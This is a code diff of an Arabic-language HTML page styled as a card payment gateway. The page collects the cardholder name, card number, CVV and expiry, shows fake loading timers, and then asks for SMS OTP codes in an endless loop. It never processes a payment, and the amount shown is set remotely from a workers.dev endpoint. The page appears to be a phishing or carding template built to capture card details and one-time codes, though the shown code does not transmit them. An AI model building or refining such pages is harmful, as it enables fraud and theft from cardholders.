@@ -2,8 +2,9 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
-<title>بوابة دفع | بطاقة ائتمانية</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>بوابة دفع</title>
+
 <style>
 *{
   box-sizing:border-box;
@@ -23,7 +24,6 @@ html,body{
   max-width:380px;
   margin:0 auto;
   padding:20px 14px;
-  position: relative;
 }
 
 .amount-title{
@@ -147,10 +147,8 @@ html,body{
   color:#fff;
   font-size:20px;
   cursor:pointer;
-  font-weight: bold;
 }
 
-/* expiry wrap like CVV field */
 .expiry-wrap{
   width:100%;
   height:64px;
@@ -204,155 +202,221 @@ html,body{
   color:#9a9a9a;
 }
 
-/* ----- screens (loading + otp) - مطابقة للتصميم ----- */
-.screen {
-  display: none;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  background: transparent;
-  width: 100%;
-  margin-top: 30px;
-  margin-bottom: 20px;
+/* شاشات إضافية */
+.screen{
+  display:none;
 }
 
-.loader {
-  width: 70px;
-  height: 70px;
-  border: 6px solid #e0e0e0;
-  border-top: 6px solid #2a7eff;
-  border-radius: 50%;
-  animation: spin 0.9s linear infinite;
-  margin: 0 auto 20px auto;
+.screen.active{
+  display:block;
 }
 
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
+.loader-screen{
+  width:100%;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  background:#f3f3f3;
 }
 
-.countdown-text {
-  font-size: 32px;
-  font-weight: 800;
-  background: #fff;
-  padding: 8px 20px;
-  border-radius: 48px;
-  display: inline-block;
-  margin-top: 12px;
-  color: #1e2a3a;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+.loader-box{
+  width:100%;
+  max-width:380px;
+  text-align:center;
 }
 
-.otp-message {
-  font-size: 16px;
-  color: #2c3e4e;
-  background: #fff7e8;
-  padding: 16px;
-  border-radius: 20px;
-  margin-bottom: 28px;
-  line-height: 1.5;
-  text-align: center;
-  border-right: 4px solid #2ac769;
+.blue-spinner{
+  width:84px;
+  height:84px;
+  margin:0 auto 18px;
+  border-radius:50%;
+  border:8px solid rgba(31,122,255,0.18);
+  border-top-color:#1f7aff;
+  animation:spin 0.9s linear infinite;
 }
 
-.otp-input {
-  width: 100%;
-  text-align: center;
-  letter-spacing: 2px;
-  font-size: 22px;
-  font-weight: 600;
+.loader-count{
+  font-size:30px;
+  font-weight:800;
+  direction:ltr;
+  color:#1f7aff;
 }
 
-.otp-button {
-  width: 100%;
-  height: 56px;
-  background: #2ac769;
-  border: none;
-  border-radius: 16px;
-  color: white;
-  font-size: 20px;
-  font-weight: bold;
-  margin-top: 28px;
-  cursor: pointer;
+.otp-page{
+  width:100%;
+  max-width:380px;
+  margin:0 auto;
+  padding:20px 14px;
 }
 
-.screen .input {
-  margin-bottom: 10px;
+.otp-title{
+  text-align:center;
+  font-size:24px;
+  font-weight:800;
+  margin:18px 0 14px;
 }
 
-.otp-error {
-  border-color: #d93025 !important;
-  background: #fff7f7;
+.otp-text{
+  text-align:center;
+  font-size:17px;
+  line-height:1.9;
+  color:#333;
+  margin:0 0 26px;
 }
 
-.hide-payment-section {
-  display: none;
+.otp-btn{
+  width:100%;
+  height:64px;
+  margin-top:16px;
+  border:none;
+  border-radius:16px;
+  background:#2ac769;
+  color:#fff;
+  font-size:20px;
+  cursor:pointer;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
 }
 </style>
 </head>
 <body>
-<div class="page">
-  <!-- القسم الأساسي للدفع (يتم إخفاؤه عند الانتقال) -->
-  <div id="paymentSection">
+
+<div class="screen active" id="paymentScreen">
+  <div class="page">
+
     <div class="amount-title">المبلغ</div>
     <div class="amount-value" id="topAmount"></div>
+
     <div class="divider">
       <span>ادفع عن طريق البطاقة</span>
     </div>
+
     <div class="field-group">
       <label class="label">اسم حامل البطاقة</label>
-      <input class="input" id="cardHolder" placeholder="اسم حامل البطاقة" inputmode="text" autocomplete="cc-name" maxlength="40">
+      <input
+        class="input"
+        id="cardHolder"
+        placeholder="اسم حامل البطاقة"
+        inputmode="text"
+        autocomplete="cc-name"
+        maxlength="40"
+      >
     </div>
+
     <div class="field-group">
       <div class="card-head">
         <label class="label">معلومات البطاقة</label>
-        <div class="card-logo-top" oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
-          <img src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png" alt="Card Logo" draggable="false" oncontextmenu="return false" ondragstart="return false">
+
+        <div class="card-logo-top"
+             oncontextmenu="return false"
+             ondragstart="return false"
+             onselectstart="return false">
+          <img
+            id="cardTypeLogo"
+            src="https://i.postimg.cc/VN2hJkfC/20260417-191748.png"
+            alt="Card Logo"
+            draggable="false"
+            oncontextmenu="return false"
+            ondragstart="return false"
+          >
         </div>
       </div>
-      <input class="input card-number" id="cardNumber" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" autocomplete="cc-number">
+
+      <input
+        class="input card-number"
+        id="cardNumber"
+        placeholder="0000 0000 0000 0000"
+        inputmode="numeric"
+        maxlength="19"
+        autocomplete="cc-number"
+      >
+
       <div class="row">
         <div class="col">
-          <input class="input" id="cvv" placeholder="CVV" inputmode="numeric" maxlength="3" autocomplete="cc-csc">
+          <input
+            class="input"
+            id="cvv"
+            placeholder="CVV"
+            inputmode="numeric"
+            maxlength="3"
+            autocomplete="cc-csc"
+          >
         </div>
+
         <div class="col">
           <div class="expiry-wrap" id="expiryWrap">
-            <select id="expMonth" class="expiry-select"><option value="">MM</option></select>
+            <select id="expMonth" class="expiry-select">
+              <option value="">MM</option>
+            </select>
+
             <div class="expiry-separator">/</div>
-            <select id="expYear" class="expiry-select"><option value="">YY</option></select>
+
+            <select id="expYear" class="expiry-select">
+              <option value="">YY</option>
+            </select>
           </div>
         </div>
       </div>
     </div>
+
     <button class="pay-btn" id="payBtn"></button>
   </div>
+</div>
 
-  <!-- شاشة الدولاب الأزرق مع عداد (60 ثانية) أو بدون عداد (30 ثانية) -->
-  <div id="loadingScreen" class="screen">
-    <div class="loader"></div>
-    <div id="countdownDisplay" class="countdown-text" style="display: none;">60</div>
+<div class="screen" id="loader60Screen">
+  <div class="loader-screen">
+    <div class="loader-box">
+      <div class="blue-spinner"></div>
+      <div class="loader-count" id="loader60Count">60</div>
+    </div>
   </div>
+</div>
 
-  <!-- شاشة إدخال رمز التحقق OTP -->
-  <div id="otpScreen" class="screen">
-    <div class="otp-message">يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة</div>
-    <input type="text" id="otpCode" class="input otp-input" placeholder="أدخل رمز التحقق" inputmode="numeric" maxlength="6" autocomplete="off">
-    <button id="verifyOtpBtn" class="otp-button">تحقق</button>
+<div class="screen" id="otpScreen">
+  <div class="otp-page">
+    <div class="otp-title">رمز التحقق</div>
+    <p class="otp-text">
+      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
+    </p>
+
+    <div class="field-group">
+      <input
+        class="input"
+        id="otpInput"
+        placeholder="أدخل رمز التحقق"
+        inputmode="numeric"
+        maxlength="6"
+        autocomplete="one-time-code"
+      >
+    </div>
+
+    <button class="otp-btn" id="otpBtn">تحقق</button>
+  </div>
+</div>
+
+<div class="screen" id="loader30Screen">
+  <div class="loader-screen">
+    <div class="loader-box">
+      <div class="blue-spinner"></div>
+    </div>
   </div>
 </div>
 
 <script>
-// ------------------- الثوابت والإعدادات ------------------
 const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
-const CORRECT_OTP = "123456";   // رمز صحيح للمحاكاة (يمكن تغييره، لكنه مطابق للمتطلب: رقم مضبوط)
 
-// المتغيرات العامة
-let countdownInterval = null;
-let currentLoadingMode = null;   // 'countdown' or 'silent'
-let paymentAmount = "";
+/* شعارات الأنواع */
+const CARD_LOGOS = {
+  visa: "https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png",
+  mastercard: "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg",
+  mada: "https://upload.wikimedia.org/wikipedia/commons/1/16/Mada_Logo.svg",
+  unknown: "https://i.postimg.cc/VN2hJkfC/20260417-191748.png"
+};
 
-// ------------------- التعامل مع المبلغ من API ------------------
 function normalizeAmount(value) {
   if (!value || typeof value !== "string") return null;
   return value.trim();
@@ -361,15 +425,19 @@ function normalizeAmount(value) {
 function setAmount(amount) {
   const finalAmount = normalizeAmount(amount);
   if (!finalAmount) return;
-  paymentAmount = finalAmount;
+
   document.getElementById("topAmount").textContent = finalAmount;
   document.getElementById("payBtn").textContent = "ادفع " + finalAmount;
 }
 
 async function loadAmount() {
   try {
-    const res = await fetch(API_URL + "?t=" + Date.now(), { cache: "no-store" });
+    const res = await fetch(API_URL + "?t=" + Date.now(), {
+      cache: "no-store"
+    });
+
     const data = await res.json();
+
     if (data && data.ok && data.amount) {
       setAmount(data.amount);
     }
@@ -377,78 +445,39 @@ async function loadAmount() {
     console.log("تعذر تحميل المبلغ", e);
   }
 }
+
 loadAmount();
 setInterval(loadAmount, 3000);
 
-// ------------------- مساعدة الحقول: اسم حامل البطاقة (حروف إنجليزية + مسافات) ------------------
-const cardHolderInput = document.getElementById("cardHolder");
-cardHolderInput.addEventListener("input", function () {
-  this.value = this.value.replace(/[^A-Za-z ]/g, "");
-});
-cardHolderInput.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  const cleaned = text.replace(/[^A-Za-z ]/g, "");
-  document.execCommand("insertText", false, cleaned);
-});
+/* عناصر */
+const paymentScreen = document.getElementById("paymentScreen");
+const loader60Screen = document.getElementById("loader60Screen");
+const otpScreen = document.getElementById("otpScreen");
+const loader30Screen = document.getElementById("loader30Screen");
 
-// رقم البطاقة (تنسيق 16 رقم)
-const cardNumberInput = document.getElementById("cardNumber");
-cardNumberInput.addEventListener("input", function () {
-  let digits = this.value.replace(/\D/g, "").slice(0, 16);
-  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-  validateCardNumber();
-});
-cardNumberInput.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  let digits = text.replace(/\D/g, "").slice(0, 16);
-  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
-  validateCardNumber();
-});
-function validateCardNumber() {
-  const digits = cardNumberInput.value.replace(/\D/g, "");
-  if (digits.length === 0 || digits.length === 16) {
-    cardNumberInput.classList.remove("error");
-    return true;
-  }
-  cardNumberInput.classList.add("error");
-  return false;
-}
-
-// CVV (3 أرقام)
-const cvvInput = document.getElementById("cvv");
-cvvInput.addEventListener("input", function () {
-  this.value = this.value.replace(/\D/g, "").slice(0, 3);
-  validateCVV();
-});
-cvvInput.addEventListener("paste", function (e) {
-  e.preventDefault();
-  const text = (e.clipboardData || window.clipboardData).getData("text");
-  this.value = text.replace(/\D/g, "").slice(0, 3);
-  validateCVV();
-});
-function validateCVV() {
-  if (cvvInput.value.length === 0 || cvvInput.value.length === 3) {
-    cvvInput.classList.remove("error");
-    return true;
-  }
-  cvvInput.classList.add("error");
-  return false;
-}
-
-// ------------------- تاريخ الانتهاء (شهر / سنة) ------------------
+const cardHolder = document.getElementById("cardHolder");
+const cardNumber = document.getElementById("cardNumber");
+const cvv = document.getElementById("cvv");
 const expMonth = document.getElementById("expMonth");
 const expYear = document.getElementById("expYear");
 const expiryWrap = document.getElementById("expiryWrap");
+const payBtn = document.getElementById("payBtn");
+const otpInput = document.getElementById("otpInput");
+const otpBtn = document.getElementById("otpBtn");
+const loader60Count = document.getElementById("loader60Count");
+const cardTypeLogo = document.getElementById("cardTypeLogo");
 
+let loader60Timer = null;
+let loader30Timer = null;
+
+/* تعبئة الأشهر والسنوات */
 for (let i = 1; i <= 12; i++) {
   const option = document.createElement("option");
   option.value = String(i).padStart(2, "0");
   option.textContent = String(i).padStart(2, "0");
   expMonth.appendChild(option);
 }
-const currentYear = new Date().getFullYear() % 100;
+
 for (let y = 26; y <= 50; y++) {
   const option = document.createElement("option");
   option.value = String(y);
@@ -457,274 +486,247 @@ for (let y = 26; y <= 50; y++) {
 }
 
 [expMonth, expYear].forEach(select => {
-  select.addEventListener("paste", (e) => e.preventDefault());
-});
-
-function validateExpiry(showErrorStyle = true) {
-  const monthValid = expMonth.value !== "";
-  const yearValid = expYear.value !== "";
-  const bothSelected = monthValid && yearValid;
-  if (showErrorStyle) {
-    if (bothSelected || (!monthValid && !yearValid)) {
-      expiryWrap.classList.remove("error");
-    } else {
-      expiryWrap.classList.add("error");
-    }
-  }
-  expMonth.classList.toggle("has-value", expMonth.value !== "");
-  expYear.classList.toggle("has-value", expYear.value !== "");
-  return bothSelected;
-}
-expMonth.addEventListener("change", () => validateExpiry(true));
-expYear.addEventListener("change", () => validateExpiry(true));
-
-// ------------------- كشف نوع البطاقة (قوي جداً: فيزا / ماستر كارد / مدى / بدون نوع) ------------------
-function getCardType(cardNumberRaw) {
-  const clean = cardNumberRaw.replace(/\D/g, "");
-  if (clean.length < 2) return "بدون نوع";
-  // قائمة BINs مدى (Mada) - أشهر البنوك السعودية، تغطية واسعة
-  const madaPrefixes = [
-    "440647", "445872", "446404", "457865", "468540", "483010", "489318", "504300",
-    "530060", "531196", "535825", "537767", "539931", "543357", "545613", "548736",
-    "556581", "558237", "585265", "588845", "590313", "604786", "607156", "608072",
-    "627447", "636214", "968201", "407395", "410588", "422817", "428671", "428672",
-    "428673", "428674", "428675", "431361", "432641", "434107", "435532", "436633",
-    "437829", "438022", "440445", "440449", "440545", "440674", "440675", "440676",
-    "440788", "440866", "440960", "441029", "441114", "441643", "441644", "441645",
-    "441775", "442003", "442004", "442424", "442425", "442516", "442517", "442596"
-  ];
-  for (let prefix of madaPrefixes) {
-    if (clean.startsWith(prefix)) return "مدى";
-  }
-  // ماستر كارد: 51-55 أو 2221-2720
-  const firstTwo = parseInt(clean.substring(0, 2), 10);
-  const firstFour = parseInt(clean.substring(0, 4), 10);
-  if ((firstTwo >= 51 && firstTwo <= 55) || (firstFour >= 2221 && firstFour <= 2720)) {
-    return "ماستر كارد";
-  }
-  // فيزا: تبدأ بـ 4 (وليس مدى)
-  if (clean.startsWith("4")) {
-    return "فيزا";
-  }
-  return "بدون نوع";
-}
-
-// مراقبة رقم البطاقة لتحديد النوع داخلياً (اختبار قوي – لا يتطلب إظهار UI لكن يثبت الكشف)
-cardNumberInput.addEventListener("input", function() {
-  const raw = this.value.replace(/\D/g, "");
-  if (raw.length >= 4) {
-    const detected = getCardType(raw);
-    console.log("[Card Type Detect]", detected);
-  }
-});
-
-// ------------------- وظائف التحكم في الشاشات (الدفع / التحميل / OTP) ------------------
-const paymentSection = document.getElementById("paymentSection");
-const loadingScreen = document.getElementById("loadingScreen");
-const otpScreen = document.getElementById("otpScreen");
-const countdownSpan = document.getElementById("countdownDisplay");
-
-function hideAllScreens() {
-  paymentSection.style.display = "none";
-  loadingScreen.style.display = "none";
-  otpScreen.style.display = "none";
-}
-
-function showPaymentScreen() {
-  hideAllScreens();
-  paymentSection.style.display = "block";
-}
-
-function showLoadingScreen(hasCountdown, seconds, onCompleteCallback) {
-  hideAllScreens();
-  loadingScreen.style.display = "flex";
-  if (countdownInterval) clearInterval(countdownInterval);
-  if (hasCountdown) {
-    countdownSpan.style.display = "inline-block";
-    let remaining = seconds;
-    countdownSpan.innerText = remaining;
-    countdownInterval = setInterval(() => {
-      remaining--;
-      if (remaining <= 0) {
-        clearInterval(countdownInterval);
-        countdownInterval = null;
-        if (onCompleteCallback) onCompleteCallback();
-      } else {
-        countdownSpan.innerText = remaining;
-      }
-    }, 1000);
-  } else {
-    countdownSpan.style.display = "none";
-    // بدون عداد ولكن نهاية timer بسيط بعد 30 ثانية (دولاب فقط)
-    if (onCompleteCallback) {
-      const silentTimer = setTimeout(() => {
-        if (onCompleteCallback) onCompleteCallback();
-      }, seconds * 1000);
-      // تخزين الـ timeout لمسحه لو لزم
-      window._silentLoadingTimeout = silentTimer;
-    }
-  }
-}
-
-function showOtpScreen() {
-  if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
-  if (window._silentLoadingTimeout) { clearTimeout(window._silentLoadingTimeout); window._silentLoadingTimeout = null; }
-  hideAllScreens();
-  otpScreen.style.display = "flex";
-  // reset OTP field and error style
-  const otpField = document.getElementById("otpCode");
-  otpField.value = "";
-  otpField.classList.remove("otp-error");
-  otpField.classList.remove("error");
-}
-
-// دالة لعرض الدولاب 30 ثانية بدون عداد ثم العودة لشاشة OTP
-function start30sSpinnerAndBackToOtp() {
-  if (countdownInterval) clearInterval(countdownInterval);
-  if (window._silentLoadingTimeout) clearTimeout(window._silentLoadingTimeout);
-  showLoadingScreen(false, 30, () => {
-    showOtpScreen();
-  });
-}
-
-// ------------------- التحقق من صحة كل الحقول قبل الدفع ------------------
-function validatePaymentForm() {
-  let isValid = true;
-  // 1. اسم حامل البطاقة (إنجليزي ومسافات وليس فارغ)
-  const holder = cardHolderInput.value.trim();
-  const holderRegex = /^[A-Za-z\s]+$/;
-  if (holder === "" || !holderRegex.test(holder)) {
-    cardHolderInput.classList.add("error");
-    isValid = false;
-  } else {
-    cardHolderInput.classList.remove("error");
-  }
-  // 2. رقم البطاقة: يجب 16 رقمًا بعد إزالة المسافات
-  const rawCard = cardNumberInput.value.replace(/\D/g, "");
-  if (rawCard.length !== 16) {
-    cardNumberInput.classList.add("error");
-    isValid = false;
-  } else {
-    cardNumberInput.classList.remove("error");
-  }
-  // 3. CVV: 3 أرقام
-  const cvvVal = cvvInput.value.replace(/\D/g, "");
-  if (cvvVal.length !== 3) {
-    cvvInput.classList.add("error");
-    isValid = false;
-  } else {
-    cvvInput.classList.remove("error");
-  }
-  // 4. تاريخ الانتهاء (كلاهما مختار)
-  const expiryValid = validateExpiry(true);
-  if (!expiryValid) {
-    expiryWrap.classList.add("error");
-    isValid = false;
-  } else {
-    expiryWrap.classList.remove("error");
-    // التحقق الإضافي: هل التاريخ منتهي (اختياري لكنه احترافي)
-    const selectedMonth = parseInt(expMonth.value, 10);
-    const selectedYearFull = 2000 + parseInt(expYear.value, 10);
-    const now = new Date();
-    const currentYearNum = now.getFullYear();
-    const currentMonth = now.getMonth() + 1;
-    if (selectedYearFull < currentYearNum || (selectedYearFull === currentYearNum && selectedMonth < currentMonth)) {
-      expiryWrap.classList.add("error");
-      isValid = false;
-    }
-  }
-  return isValid;
-}
-
-// ------------------- حدث الضغط على زر الدفع ------------------
-document.getElementById("payBtn").addEventListener("click", function(e) {
-  e.preventDefault();
-  if (!validatePaymentForm()) {
-    return; // الحقول غير صحيحة تظهر باللون الأحمر بدون انتقال
-  }
-  // التحقق من نوع البطاقة بشكل قوي (اختبار فقط للتأكيد ، لكن لا يمنع الدفع)
-  const cardNumberRaw = cardNumberInput.value.replace(/\D/g, "");
-  const detectedType = getCardType(cardNumberRaw);
-  console.log("نوع البطاقة المكتشف:", detectedType);
-  
-  // بعد نجاح التحقق ننتقل إلى شاشة التحميل مع عداد 60 ثانية
-  if (countdownInterval) clearInterval(countdownInterval);
-  if (window._silentLoadingTimeout) clearTimeout(window._silentLoadingTimeout);
-  showLoadingScreen(true, 60, () => {
-    // بعد انتهاء الـ 60 ثانية ننتقل إلى شاشة رمز التحقق OTP
-    showOtpScreen();
+  select.addEventListener("paste", function (e) {
+    e.preventDefault();
   });
 });
 
-// ------------------- معالجة OTP (رمز التحقق) ------------------
-const otpInput = document.getElementById("otpCode");
-const verifyBtn = document.getElementById("verifyOtpBtn");
+/* تبديل الشاشات */
+function showScreen(screenEl) {
+  [paymentScreen, loader60Screen, otpScreen, loader30Screen].forEach(el => {
+    el.classList.remove("active");
+  });
+  screenEl.classList.add("active");
+}
 
-otpInput.addEventListener("input", function() {
-  this.value = this.value.replace(/\D/g, "").slice(0, 6);
-  if (this.value.length >= 4) {
-    this.classList.remove("otp-error");
-    this.classList.remove("error");
-  }
+/* اسم حامل البطاقة */
+cardHolder.addEventListener("input", function () {
+  this.value = this.value.replace(/[^A-Za-z ]/g, "");
+  validateCardHolder();
 });
-otpInput.addEventListener("paste", function(e) {
+
+cardHolder.addEventListener("paste", function (e) {
   e.preventDefault();
   const text = (e.clipboardData || window.clipboardData).getData("text");
-  const digits = text.replace(/\D/g, "").slice(0, 6);
-  this.value = digits;
-  if (digits.length >= 4 && digits.length <= 6) {
-    this.classList.remove("otp-error");
-    this.classList.remove("error");
-  }
+  const cleaned = text.replace(/[^A-Za-z ]/g, "");
+  this.value = cleaned.slice(0, 40);
+  validateCardHolder();
 });
 
-function validateOtp() {
-  const code = otpInput.value.trim();
-  if (code.length >= 4 && code.length <= 6 && /^\d+$/.test(code)) {
-    otpInput.classList.remove("otp-error");
-    otpInput.classList.remove("error");
-    return true;
-  } else {
-    otpInput.classList.add("otp-error");
-    otpInput.classList.add("error");
+function validateCardHolder() {
+  const value = cardHolder.value.trim();
+  const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
+  if (value === "") {
+    cardHolder.classList.remove("error");
     return false;
   }
+  cardHolder.classList.toggle("error", !valid);
+  return valid;
 }
 
-verifyBtn.addEventListener("click", function() {
-  const code = otpInput.value.trim();
-  if (!validateOtp()) {
-    return; // حقل فارغ أو غير مطابق للطول 4-6 أرقام -> إطار أحمر
+/* تحديد نوع البطاقة */
+function detectCardType(digits) {
+  if (!digits) return "unknown";
+
+  if (/^4/.test(digits)) {
+    return "visa";
   }
-  // مقارنة مع الرمز الصحيح (123456) كما هو مطلوب "الرقم مضبوط"
-  if (code === CORRECT_OTP) {
-    // رمز صحيح -> ننتقل إلى الدولاب الأزرق 30 ثانية بدون عداد ثم نعود إلى شاشة OTP
-    if (countdownInterval) clearInterval(countdownInterval);
-    if (window._silentLoadingTimeout) clearTimeout(window._silentLoadingTimeout);
-    showLoadingScreen(false, 30, () => {
-      showOtpScreen();
-    });
+
+  if (
+    /^(5[1-5])/.test(digits) ||
+    /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(digits)
+  ) {
+    return "mastercard";
+  }
+
+  if (
+    /^(588845|440647|440795|446404|457865|457997|474491|636120|9682)/.test(digits)
+  ) {
+    return "mada";
+  }
+
+  return "unknown";
+}
+
+function updateCardTypeLogo(type) {
+  cardTypeLogo.src = CARD_LOGOS[type] || CARD_LOGOS.unknown;
+}
+
+/* رقم البطاقة */
+cardNumber.addEventListener("input", function () {
+  let digits = this.value.replace(/\D/g, "").slice(0, 16);
+  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+  validateCardNumber();
+  updateCardTypeLogo(detectCardType(digits));
+});
+
+cardNumber.addEventListener("paste", function (e) {
+  e.preventDefault();
+  const text = (e.clipboardData || window.clipboardData).getData("text");
+  let digits = text.replace(/\D/g, "").slice(0, 16);
+  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
+  validateCardNumber();
+  updateCardTypeLogo(detectCardType(digits));
+});
+
+function validateCardNumber() {
+  const digits = cardNumber.value.replace(/\D/g, "");
+  const valid = digits.length === 16;
+  if (digits.length === 0) {
+    cardNumber.classList.remove("error");
+    return false;
+  }
+  cardNumber.classList.toggle("error", !valid);
+  return valid;
+}
+
+/* CVV */
+cvv.addEventListener("input", function () {
+  this.value = this.value.replace(/\D/g, "").slice(0, 3);
+  validateCVV();
+});
+
+cvv.addEventListener("paste", function (e) {
+  e.preventDefault();
+  const text = (e.clipboardData || window.clipboardData).getData("text");
+  this.value = text.replace(/\D/g, "").slice(0, 3);
+  validateCVV();
+});
+
+function validateCVV() {
+  const valid = /^\d{3}$/.test(cvv.value);
+  if (cvv.value.length === 0) {
+    cvv.classList.remove("error");
+    return false;
+  }
+  cvv.classList.toggle("error", !valid);
+  return valid;
+}
+
+/* تاريخ الانتهاء */
+function validateExpiry() {
+  const valid = expMonth.value !== "" && expYear.value !== "";
+
+  if (valid || (expMonth.value === "" && expYear.value === "")) {
+    expiryWrap.classList.remove("error");
   } else {
-    // رمز غير صحيح: نضيف حدود حمراء ونبقي على شاشة OTP
-    otpInput.classList.add("otp-error");
-    otpInput.classList.add("error");
-    // يمكن إظهار رسالة سريعة ولكن دون تغيير التصميم الأساسي (حسب المتطلب فقط إطار احمر)
+    expiryWrap.classList.add("error");
+  }
+
+  expMonth.classList.toggle("has-value", expMonth.value !== "");
+  expYear.classList.toggle("has-value", expYear.value !== "");
+
+  return valid;
+}
+
+expMonth.addEventListener("change", validateExpiry);
+expYear.addEventListener("change", validateExpiry);
+
+/* OTP */
+otpInput.addEventListener("input", function () {
+  this.value = this.value.replace(/\D/g, "").slice(0, 6);
+  validateOTP();
+});
+
+otpInput.addEventListener("paste", function (e) {
+  e.preventDefault();
+  const text = (e.clipboardData || window.clipboardData).getData("text");
+  this.value = text.replace(/\D/g, "").slice(0, 6);
+  validateOTP();
+});
+
+function validateOTP() {
+  const value = otpInput.value;
+  const valid = /^\d{4,6}$/.test(value);
+  if (value.length === 0) {
+    otpInput.classList.remove("error");
+    return false;
+  }
+  otpInput.classList.toggle("error", !valid);
+  return valid;
+}
+
+/* منع تنزيل/سحب/تحديد الشعار */
+document.addEventListener("contextmenu", function (e) {
+  if (e.target.closest(".card-logo-top")) {
+    e.preventDefault();
   }
 });
 
-// إضافة منع السحب / السياق للشعار
-document.addEventListener("contextmenu", function(e) {
-  if (e.target.closest(".card-logo-top")) e.preventDefault();
-});
-document.addEventListener("dragstart", function(e) {
-  if (e.target.closest(".card-logo-top")) e.preventDefault();
-});
-document.addEventListener("selectstart", function(e) {
-  if (e.target.closest(".card-logo-top")) e.preventDefault();
+document.addEventListener("dragstart", function (e) {
+  if (e.target.closest(".card-logo-top")) {
+    e.preventDefault();
+  }
 });
 
-// بدء التشغيل: عرض شاشة الدفع
-showPaymentScreen();
+document.addEventListener("selectstart", function (e) {
+  if (e.target.closest(".card-logo-top")) {
+    e.preventDefault();
+  }
+});
+
+/* التحقق الكامل */
+function validatePaymentForm() {
+  const holderOk = validateCardHolder();
+  const cardOk = validateCardNumber();
+  const cvvOk = validateCVV();
+  const expiryOk = validateExpiry();
+
+  if (!cardHolder.value.trim()) cardHolder.classList.add("error");
+  if (!cardNumber.value.replace(/\D/g, "")) cardNumber.classList.add("error");
+  if (!cvv.value) cvv.classList.add("error");
+  if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");
+
+  return holderOk && cardOk && cvvOk && expiryOk;
+}
+
+/* تحميل 60 ثانية ثم OTP */
+function startLoader60ThenOTP() {
+  clearInterval(loader60Timer);
+  let seconds = 60;
+  loader60Count.textContent = seconds;
+  showScreen(loader60Screen);
+
+  loader60Timer = setInterval(() => {
+    seconds--;
+    loader60Count.textContent = seconds;
+
+    if (seconds <= 0) {
+      clearInterval(loader60Timer);
+      showScreen(otpScreen);
+    }
+  }, 1000);
+}
+
+/* تحميل 30 ثانية بدون عداد ثم رجوع OTP */
+function startLoader30ThenBackOTP() {
+  clearTimeout(loader30Timer);
+  showScreen(loader30Screen);
+
+  loader30Timer = setTimeout(() => {
+    showScreen(otpScreen);
+  }, 30000);
+}
+
+/* زر ادفع */
+payBtn.addEventListener("click", function () {
+  if (!validatePaymentForm()) return;
+  startLoader60ThenOTP();
+});
+
+/* زر تحقق */
+otpBtn.addEventListener("click", function () {
+  const otpOk = validateOTP();
+
+  if (!otpInput.value) {
+    otpInput.classList.add("error");
+    return;
+  }
+
+  if (!otpOk) return;
+
+  startLoader30ThenBackOTP();
+});
 </script>
 </body>
 </html>
